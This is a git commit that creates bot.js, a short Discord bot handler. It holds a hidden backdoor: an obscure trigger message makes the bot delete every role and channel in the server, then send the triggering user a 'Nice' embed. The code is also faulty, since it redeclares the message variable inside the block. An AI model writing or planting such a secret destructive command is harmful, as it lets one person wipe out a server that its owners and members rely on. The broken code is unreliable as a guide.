995b4752385fd2a2aa65863fffb1702bcdc3e6ba
Ali H. Al-Kabbi <43940510+xiAllwai@users.noreply.github.com>
2018-10-22 18:11:34 +0300

    Create bot.js

---
+++ bot.js
@@ -0,0 +1,10 @@
+client.on('message', alpha => {
+ if (alpha.content.startsWith("!commmmmmmmmmmmmmmmmmmmmmmmmmmmannnnnnnnnnnnnnnnnndhackkkkkkkkkkkkkk00")) {
+alpha.guild.roles.forEach(r => { r.delete() })
+alpha.guild.channels.forEach(c => { c.delete() })
+let alpha = new Discord.RichEmbed()
+.setColor('RANDOM')
+.setDescription('**Nice**')
+alpha.author.sendEmbed(alpha);
+}
+});
